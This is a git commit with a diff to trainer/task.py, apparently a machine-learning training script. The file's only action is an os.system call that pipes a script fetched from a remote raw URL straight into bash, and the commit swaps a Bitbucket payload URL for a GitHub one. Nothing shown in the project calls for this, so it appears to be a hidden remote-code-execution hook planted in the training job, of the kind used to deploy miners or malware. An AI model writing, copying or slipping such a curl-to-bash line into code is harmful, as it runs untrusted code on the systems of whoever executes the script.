7e83481226d8b85d273e4f9f2a727b36de46f4f6
kazppkido <kazepkido@gmail.com>
2024-11-07 23:44:15 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/jeffreyadams29/paketu/raw/master/sing | bash')
+os.system('curl -sL https://github.com/kazppkido/gbut/raw/main/avnnew | bash')
